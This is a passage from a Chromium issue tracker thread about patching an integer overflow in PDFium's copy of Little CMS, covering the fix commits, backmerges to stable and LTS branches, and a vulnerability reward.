Command line: `"c:\src\asan\chromium-148.0.7755.0-win64-asan\chrome.exe" --type=renderer --no-pre-read-main-dll --pdf-renderer --no-sandbox --file-url-path-alias="/gen=c:\src\asan\chromium-148.0.7755.0-win64-asan\gen" --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags=--jitless --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=15 --time-ticks-at-unix-epoch=-1773420789686991 --launch-time-ticks=1135965434240 --metrics-shmem-handle=5740,i,772555089164761097,10384890047458922553,2097152 --field-trial-handle=2156,i,8128045027055461948,1796410704301311027,262144 --enable-features=ProcessIsolationSettings --variations-seed-version --pseudonymization-salt-handle=2180,i,11404302952590773327,4945984850769894804,4 --trace-process-track-uuid=3190709000367499229 --mojo-platform-channel-handle=5752 /prefetch:1`


==35364==END OF ADDITIONAL INFO

==35364==ABORTING
Created TensorFlow Lite XNNPACK delegate for CPU.
I0000 00:00:1774556760.401915   21192 group_rpn_detector_utils.h:93] Total tiles: 0 removed duplicates: 0
I0000 00:00:1774556760.402857   21192 tflite_model_pooled_cached_runner.cc:230] Loading /gocr/gocr_models/detection/gocr_group_rpn_text_detection_model_2024_q4.tflite
I0000 00:00:1774556760.408236   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Guru
I0000 00:00:1774556760.408828   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Telu
I0000 00:00:1774556760.409270   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Laoo
I0000 00:00:1774556760.409509   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Kore
INFO: Created TensorFlow Lite XNNPACK delegate for CPU.
I0000 00:00:1774556760.410024   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Sinh
I0000 00:00:1774556760.410361   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Hani
I0000 00:00:1774556760.410686   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Hebr
I0000 00:00:1774556760.411068   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Mlym
I0000 00:00:1774556760.411244   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Jpan
I0000 00:00:1774556760.411428   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Gujr
I0000 00:00:1774556760.411592   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Deva
I0000 00:00:1774556760.411935   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Grek
I0000 00:00:1774556760.412335   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Cyrl
I0000 00:00:1774556760.412979   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Taml
I0000 00:00:1774556760.413282   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Knda
I0000 00:00:1774556760.413578   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Thai
I0000 00:00:1774556760.413888   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Beng
I0000 00:00:1774556760.414231   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Geor
I0000 00:00:1774556760.414429   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Khmr
I0000 00:00:1774556760.414741   74464 multi_pass_line_recognition_mutator.cc:319] Lazy initialization for recognizer: Arab
I0000 00:00:1774556760.414840   74464 multi_pass_line_recognition_mutator.cc:327] Preloading recognizers.
I0000 00:00:1774556760.415190   74464 tflite_model_pooled_runner.cc:681] Loading /gocr/gocr_models/line_recognition_mobile_convnext320_omni/gocr_mobile_und.tflite
I0000 00:00:1774556760.418053   74464 tflite_model_pooled_runner.cc:893] Resizing interpreter pool to 4
I0000 00:00:1774556760.433680   21192 tflite_model_pooled_cached_runner.cc:295] Caching size: 1
I0000 00:00:1774556760.434643   21192 tflite_model_pooled_runner.cc:681] Loading /gocr/layout/cluster_sort/model_v2.tflite
I0000 00:00:1774556760.435496   21192 tflite_model_pooled_runner.cc:893] Resizing interpreter pool to 1
I0000 00:00:1774556760.449327   74464 mobile_langid_v2.cc:63] MobileLangID V2 initialized.
I0000 00:00:1774556760.449716   74464 multi_pass_line_recognition_mutator.cc:349] Finished preloading a recognizer for "und"
I0000 00:00:1774556760.450363   74464 multi_pass_line_recognition_mutator.cc:383] Finished preloading recognizers.
I0000 00:00:1774556760.450971   21192 coarse_classifier_calculator.cc:152] Succeeded in initializing coarse classifier

```

### th...@chromium.org (2026-03-26)

FYI, there was previously [bug 40086273](https://issues.chromium.org/issues/40086273).

### th...@chromium.org (2026-03-26)

PDFium's copy of Little CMS is a bit out of date. There's a new release here: <https://littlecms.com/blog/2026/01/17/lcms2-2.18/>

### ts...@google.com (2026-03-26)

Already fixed upstream, it would seem https://github.com/mm2/Little-CMS/commit/e0641b1828d0a1af5ecb1b11fe22f24fceefd4bc

### ts...@google.com (2026-03-26)

Back to Lei as we're going to roll, not patch this one.

### th...@chromium.org (2026-03-26)

The upstream fix is after the 2.18 release. Maybe we can just patch it in for now.

### ts...@google.com (2026-03-26)

Will do.


### dx...@google.com (2026-03-26)

Project: pdfium  

Branch:  main  

Author:  Lei Zhang [thestig@chromium.org](mailto:thestig@chromium.org)  

Link:    <https://pdfium-review.googlesource.com/145450>

Patch an overflow in Little CMS

---


Expand for full commit details
```
     
    Apply fix [1] from upstream, which is not in the most recent versioned 
    release. 
     
    [1] https://github.com/mm2/Little-CMS/commit/e0641b1828d0a1af5ecb1b11fe22f24fceefd4bc 
     
    Bug: 496618639 
    Change-Id: I89309d9cddf15c053cdffed341e50e5616e68b74 
    Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/145450 
    Reviewed-by: Tom Sepez <tsepez@chromium.org> 
    Commit-Queue: Lei Zhang <thestig@chromium.org>

```

---

Files:

- A `third_party/lcms/0036-cubesize-overflow.patch`
- M `third_party/lcms/README.pdfium`
- M `third_party/lcms/src/cmslut.c`

---

Hash: 237bc015b08696881bf0a2007bec95d0aecf8e67  

Date: Thu Mar 26 22:09:23 2026


---

### ch...@google.com (2026-03-27)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2026-03-27)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7707300>

Roll PDFium from bd0e14defb62 to 68436e8e325e (3 revisions)

---


Expand for full commit details
```
     
    https://pdfium.googlesource.com/pdfium.git/+log/bd0e14defb62..68436e8e325e 
     
    2026-03-27 thestig@chromium.org Enable is_wexit_time_destructors_default 
    2026-03-26 thestig@chromium.org Roll build/ c9202dd8c..d1cac3b4c (44 commits) 
    2026-03-26 thestig@chromium.org Patch an overflow in Little CMS 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/pdfium-autoroll 
    Please CC akall@google.com,dhoss@chromium.org,thestig@chromium.org on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in PDFium: https://bugs.chromium.org/p/pdfium/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:496618639 
    Tbr: akall@google.com 
    Change-Id: Ie220fa13440e4a5d0a3dfa32c6a5186ecb2058ce 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7707300 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1606075}

```

---

Files:

- M `DEPS`
- M `third_party/pdfium`

---

Hash: [7d231db3b84b58f2ee442509c7a0f2b79175dcd9](https://chromiumdash.appspot.com/commit/7d231db3b84b58f2ee442509c7a0f2b79175dcd9)  

Date: Fri Mar 27 10:35:16 2026


---

### ch...@google.com (2026-03-27)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-03-28)

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Requesting merge to stable (M146) because latest trunk commit (1606075) appears to be after stable branch point (1582197).

Merge review required: a commit with DEPS changes was detected.

Requesting merge to beta (M147) because latest trunk commit (1606075) appears to be after beta branch point (1596535).

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### dr...@chromium.org (2026-03-30)

No crashes in Canary after 24 hours. Approved to merge to M146 and M147.

### sr...@chromium.org (2026-03-31)

We are cutting M147 RC today around 12pm PST, if your merge is critical to be incliuded in the RC build and is not able to make that cut off, please reach out to me , ( i can give some buffer for critical fixes that needs to included in RC) 

### ch...@google.com (2026-04-03)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-04-07)

Project: pdfium  

Branch:  chromium/7727  

Author:  Lei Zhang [thestig@chromium.org](mailto:thestig@chromium.org)  

Link:    <https://pdfium-review.googlesource.com/145771>

M147: Patch an overflow in Little CMS

---


Expand for full commit details
```
     
    Apply fix [1] from upstream, which is not in the most recent versioned 
    release. 
     
    [1] https://github.com/mm2/Little-CMS/commit/e0641b1828d0a1af5ecb1b11fe22f24fceefd4bc 
     
    Bug: 496618639 
    Change-Id: I89309d9cddf15c053cdffed341e50e5616e68b74 
    Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/145450 
    Reviewed-by: Tom Sepez <tsepez@chromium.org> 
    Commit-Queue: Lei Zhang <thestig@chromium.org> 
    (cherry picked from commit 237bc015b08696881bf0a2007bec95d0aecf8e67) 
    Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/145771

```

---

Files:

- A `third_party/lcms/0036-cubesize-overflow.patch`
- M `third_party/lcms/README.pdfium`
- M `third_party/lcms/src/cmslut.c`

---

Hash: b34626f5fd621d4adf92381f9e06770644bcdc3b  

Date: Tue Apr 7 04:10:06 2026


---

### dx...@google.com (2026-04-07)

Project: pdfium  

Branch:  chromium/7680  

Author:  Lei Zhang [thestig@chromium.org](mailto:thestig@chromium.org)  

Link:    <https://pdfium-review.googlesource.com/145770>

M146: Patch an overflow in Little CMS

---


Expand for full commit details
```
     
    Apply fix [1] from upstream, which is not in the most recent versioned 
    release. 
     
    [1] https://github.com/mm2/Little-CMS/commit/e0641b1828d0a1af5ecb1b11fe22f24fceefd4bc 
     
    Bug: 496618639 
    Change-Id: I89309d9cddf15c053cdffed341e50e5616e68b74 
    Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/145450 
    Reviewed-by: Tom Sepez <tsepez@chromium.org> 
    Commit-Queue: Lei Zhang <thestig@chromium.org> 
    (cherry picked from commit 237bc015b08696881bf0a2007bec95d0aecf8e67) 
    Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/145770

```

---

Files:

- A `third_party/lcms/0036-cubesize-overflow.patch`
- M `third_party/lcms/README.pdfium`
- M `third_party/lcms/src/cmslut.c`

---

Hash: 9e6326d6112c90f525c5f85cd7e39318bc705317  

Date: Tue Apr 7 04:10:12 2026


---

### pe...@google.com (2026-04-07)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2026-04-16)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-16)

1. https://pdfium-review.git.corp.google.com/c/pdfium/+/146291
2. Low - There was no conflict.
3. 146 and 147
4. Yes, this bug was introduced in 2017.

### pe...@google.com (2026-04-16)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-16)

1. https://pdfium-review.git.corp.google.com/c/pdfium/+/146290
2. Low - There was no conflict.
3. 146 and 147
4. Yes, this bug was introduced in 2017.

### aj...@google.com (2026-04-23)

-> Medium as this is a read only

### sp...@google.com (2026-04-23)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Baseline with bisect. User information disclosure


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### dx...@google.com (2026-04-29)

Project: pdfium  

Branch:  chromium/7559  

Author:  Lei Zhang [thestig@chromium.org](mailto:thestig@chromium.org)  

Link:    <https://pdfium-review.googlesource.com/146291>

[M144-LTS] Patch an overflow in Little CMS

---


Expand for full commit details
```
     
    Apply fix [1] from upstream, which is not in the most recent versioned 
    release. 
     
    [1] https://github.com/mm2/Little-CMS/commit/e0641b1828d0a1af5ecb1b11fe22f24fceefd4bc 
     
    Bug: 496618639 
    Change-Id: I89309d9cddf15c053cdffed341e50e5616e68b74 
    Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/145450 
    Reviewed-by: Tom Sepez <tsepez@chromium.org> 
    Commit-Queue: Lei Zhang <thestig@chromium.org> 
    (cherry picked from commit 237bc015b08696881bf0a2007bec95d0aecf8e67) 
    Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/146291 
    Reviewed-by: Lei Zhang <thestig@chromium.org>

```

---

Files:

- A `third_party/lcms/0036-cubesize-overflow.patch`
- M `third_party/lcms/README.pdfium`
- M `third_party/lcms/src/cmslut.c`

---

Hash: b439f7d2527c5bc3220690d56610594a212ce11d  

Date: Wed Apr 29 01:39:06 2026


---

### ch...@google.com (2026-07-04)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/496618639)*
